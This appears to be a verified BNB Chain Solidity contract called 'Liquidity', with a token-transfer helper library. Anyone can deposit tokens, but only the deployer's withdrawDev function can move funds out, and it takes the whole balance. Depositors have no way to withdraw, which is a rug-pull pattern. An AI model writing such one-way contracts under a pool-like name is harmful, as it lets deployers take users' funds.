/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

library TransferHelper {

    function safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract Liquidity {
    
    address dev;
    address constant token = 0x6aEF23Be4f4aB658bCe4509A11696a10aF64302B;

    constructor() {
        dev = msg.sender;
    }

    function deposit(uint amount) public  {
        TransferHelper.safeTransferFrom(token, msg.sender, address(this), amount);
    }

    function withdrawDev() public {
        require(msg.sender == dev);
        uint bal = IERC20(token).balanceOf(address(this));
        TransferHelper.safeTransfer(token, dev, bal);
    }


}